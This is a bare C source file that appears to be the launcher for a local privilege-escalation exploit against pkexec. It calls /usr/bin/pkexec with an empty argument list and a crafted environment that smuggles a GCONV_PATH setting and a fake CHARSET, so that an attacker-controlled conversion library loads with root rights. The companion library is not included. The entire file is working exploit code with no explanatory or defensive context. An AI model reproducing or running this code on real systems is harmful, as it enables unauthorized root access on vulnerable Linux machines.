
#include <unistd.h>

int main() {

    char *argv[] = { NULL };

    char *envp[] = {
        
        "rawr",
       
        "TERM=..",

        "PATH=GCONV_PATH=.",
        
        "CHARSET=WTFXD",
        NULL
    };

    execve("/usr/bin/pkexec", argv, envp);

    return 0;
}
